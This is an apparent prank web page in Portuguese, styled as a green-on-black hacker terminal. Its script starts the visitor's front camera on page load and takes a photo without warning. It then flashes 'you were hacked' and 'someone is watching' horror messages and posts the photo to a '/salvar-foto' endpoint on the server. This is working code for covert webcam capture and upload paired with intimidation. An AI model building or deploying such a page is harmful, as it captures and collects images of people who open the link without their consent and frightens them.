<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acesso Concedido</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff00;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow: hidden;
            position: relative;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                0deg,
                rgba(0, 255, 0, 0.03) 0px,
                rgba(0, 255, 0, 0.03) 1px,
                transparent 1px,
                transparent 2px
            );
            pointer-events: none;
            z-index: 1;
            animation: flicker 0.15s infinite;
        }

        @keyframes flicker {
            0% { opacity: 0.97; }
            50% { opacity: 1; }
            100% { opacity: 0.97; }
        }

        .container {
            background: rgba(10, 14, 39, 0.9);
            border: 2px solid #00ff00;
            border-radius: 5px;
            padding: 30px;
            max-width: 600px;
            width: 100%;
            text-align: center;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
            z-index: 2;
            position: relative;
            backdrop-filter: blur(10px);
            opacity: 0;
            transition: opacity 0.5s;
        }

        .container.visible {
            opacity: 1;
        }

        h1 {
            color: #00ff00;
            margin-bottom: 10px;
            font-size: 28px;
            text-shadow: 0 0 10px #00ff00;
            letter-spacing: 2px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; text-shadow: 0 0 10px #00ff00; }
            50% { opacity: 0.7; text-shadow: 0 0 20px #00ff00; }
        }

        p {
            color: #00cc00;
            margin-bottom: 30px;
            font-size: 14px;
            text-shadow: 0 0 5px #00ff00;
        }

        .video-container {
            position: relative;
            width: 100%;
            margin-bottom: 20px;
            border-radius: 5px;
            overflow: hidden;
            background: #000;
            display: none;
            border: 2px solid #00ff00;
            box-shadow: inset 0 0 20px rgba(0, 255, 0, 0.3);
        }

        video {
            width: 100%;
            height: auto;
            display: block;
            filter: hue-rotate(90deg) contrast(1.2);
        }

        canvas {
            display: none;
        }

        .button-group {
            display: flex;
            gap: 10px;
            justify-content: center;
            flex-wrap: wrap;
        }

        button {
            background: transparent;
            color: #00ff00;
            border: 2px solid #00ff00;
            padding: 12px 25px;
            font-size: 14px;
            border-radius: 3px;
            cursor: pointer;
            font-weight: bold;
            font-family: 'Courier New', monospace;
            transition: all 0.3s;
            text-shadow: 0 0 5px #00ff00;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
        }

        button:hover {
            background: #00ff00;
            color: #0a0e27;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.8);
            transform: scale(1.05);
        }

        #preview {
            width: 100%;
            border-radius: 3px;
            margin-top: 20px;
            display: none;
            border: 2px solid #00ff00;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.6);
        }

        .hacker-effect {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 255, 0, 0.1);
            display: none;
            z-index: 999;
            pointer-events: none;
            animation: hackerFlash 0.2s;
        }

        @keyframes hackerFlash {
            0%, 100% { background: rgba(0, 255, 0, 0.1); }
            50% { background: rgba(0, 255, 0, 0.3); }
        }

        /* HORROR EFFECTS */
        .horror-layer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: none;
            z-index: 1000;
            pointer-events: none;
            font-family: 'Courier New', monospace;
            font-size: 20px;
            font-weight: bold;
            color: #ff0000;
            overflow: hidden;
            animation: horrorFlicker 0.1s infinite;
        }

        @keyframes horrorFlicker {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.8; }
        }

        .horror-text {
            position: absolute;
            color: #ff0000;
            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
            animation: wobble 0.3s infinite;
            transform: rotate(45deg);
        }

        @keyframes wobble {
            0%, 100% { transform: rotate(45deg) translateX(0); }
            50% { transform: rotate(45deg) translateX(10px); }
        }

        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 3px;
            display: none;
            font-weight: bold;
            border: 2px solid;
            text-shadow: 0 0 5px currentColor;
        }

        .status.success {
            background: rgba(0, 255, 0, 0.1);
            color: #00ff00;
            border-color: #00ff00;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }

        .glitch-text {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 80px;
            font-weight: bold;
            color: #ff0000;
            text-shadow: 0 0 20px #ff0000;
            z-index: 1001;
            display: none;
            animation: glitchAnimation 0.5s;
            pointer-events: none;
        }

        @keyframes glitchAnimation {
            0% { transform: translate(-50%, -50%) skew(0deg); opacity: 1; }
            50% { transform: translate(-50%, -50%) skew(10deg); opacity: 0.8; }
            100% { transform: translate(-50%, -50%) skew(0deg); opacity: 0; }
        }

        .scary-sound {
            display: none;
        }

        .countdown {
            font-size: 72px;
            font-weight: bold;
            color: #ff0000;
            margin: 20px 0;
            display: none;
            text-shadow: 0 0 20px #ff0000;
            animation: countdownGlow 0.5s infinite;
        }

        @keyframes countdownGlow {
            0% { text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000; }
            100% { text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 60px #ff0000; }
        }
    </style>
</head>
<body>
    <div class="hacker-effect" id="hackerEffect"></div>
    <div class="horror-layer" id="horrorLayer"></div>
    <div class="glitch-text" id="glitchText"></div>

    <div class="container" id="container">
        <h1>⚠️ ACESSO CONCEDIDO ⚠️</h1>
        <p>SISTEMA DE CAPTURA ATIVADO</p>

        <div class="video-container">
            <video id="video" playsinline></video>
        </div>

        <img id="preview" alt="Captura">

        <div class="button-group">
        </div>

        <div class="status" id="status"></div>
    </div>

    <canvas id="canvas"></canvas>

    <script>
        let stream = null;
        let fotoCapturada = null;
        const container = document.getElementById('container');

        // Ocultar container no início
        container.classList.remove('visible');

        function mostrarStatus(mensagem, tipo = 'info') {
            const statusEl = document.getElementById('status');
            statusEl.textContent = mensagem;
            statusEl.className = `status ${tipo}`;
            statusEl.style.display = 'block';
        }

        function efeituHacker() {
            const effect = document.getElementById('hackerEffect');
            effect.style.display = 'block';
            setTimeout(() => {
                effect.style.display = 'none';
            }, 200);
        }

        function iniciarSequenciaHorror() {
            const horrorLayer = document.getElementById('horrorLayer');
            horrorLayer.style.display = 'block';
            
            const mensagensHorror = [
                'ALGUÉM ESTÁ ASSISTINDO',
                'PERIGO',
                'ACESSO NEGADO',
                'ERRO CRÍTICO',
                'DESCULPE',
                'VOCÊ FOI HACKEADO',
                '⚠️ ⚠️ ⚠️',
                'SISTEMA COMPROMETIDO',
                'NÃO LEVANTEM A CABEÇA',
                'VOCÊ ESTÁ SENDO OBSERVADO',
                'FECHE A CÂMERA',
                'CORRA'
            ];

            let contador = 0;
            const intervalo = setInterval(() => {
                if (contador > 15) {
                    clearInterval(intervalo);
                    horrorLayer.innerHTML = '';
                    return;
                }

                horrorLayer.innerHTML = '';

                for (let i = 0; i < 8; i++) {
                    const text = document.createElement('div');
                    text.className = 'horror-text';
                    text.textContent = mensagensHorror[Math.floor(Math.random() * mensagensHorror.length)];
                    text.style.left = Math.random() * 100 + '%';
                    text.style.top = Math.random() * 100 + '%';
                    text.style.color = Math.random() > 0.5 ? '#ff0000' : '#00ff00';
                    text.style.fontSize = (Math.random() * 40 + 20) + 'px';
                    text.style.transform = `rotate(${Math.random() * 360}deg)`;
                    horrorLayer.appendChild(text);
                }

                contador++;
            }, 300);

            // Glitch texts
            const glitchTexts = [
                'ACESSO\nADQUIRIDO',
                'VOCÊ\nFOI',
                'HACKEA\nDO',
                'SUA\nCAMERA'
            ];

            for (let i = 0; i < 5; i++) {
                setTimeout(() => {
                    const glitchEl = document.getElementById('glitchText');
                    glitchEl.textContent = glitchTexts[i % glitchTexts.length];
                    glitchEl.style.display = 'block';
                    glitchEl.style.color = Math.random() > 0.5 ? '#ff0000' : '#00ff00';
                    
                    setTimeout(() => {
                        glitchEl.style.display = 'none';
                    }, 500);
                }, i * 800);
            }
        }

        function iniciarCamera() {
            navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            })
            .then(function(mediaStream) {
                stream = mediaStream;
                const video = document.getElementById('video');
                video.srcObject = stream;

                video.onloadedmetadata = function() {
                    video.play();
                    container.classList.add('visible');
                    setTimeout(tirarFoto, 2000);
                };

                document.getElementById('video').parentElement.style.display = 'block';
            })
            .catch(function(erro) {
                console.error('Erro:', erro);
            });
        }

        function tirarFoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            ctx.drawImage(video, 0, 0);

            fotoCapturada = canvas.toDataURL('image/jpeg', 0.95);

            efeituHacker();
            document.getElementById('preview').src = fotoCapturada;
            document.getElementById('preview').style.display = 'block';

            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }

            document.getElementById('video').parentElement.style.display = 'none';

            mostrarStatus('[✓✓✓] ACESSO ADQUIRIDO', 'success');
            
            setTimeout(() => {
                iniciarSequenciaHorror();
                baixarFotoAutomatico();
            }, 1000);
        }

        function baixarFotoAutomatico() {
            if (!fotoCapturada) return;

            fetch('/salvar-foto', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ foto: fotoCapturada })
            })
            .catch(erro => {
                console.error('Erro:', erro);
            });
        }

        window.addEventListener('load', function() {
            iniciarCamera();
        });
    </script>
</body>
</html>
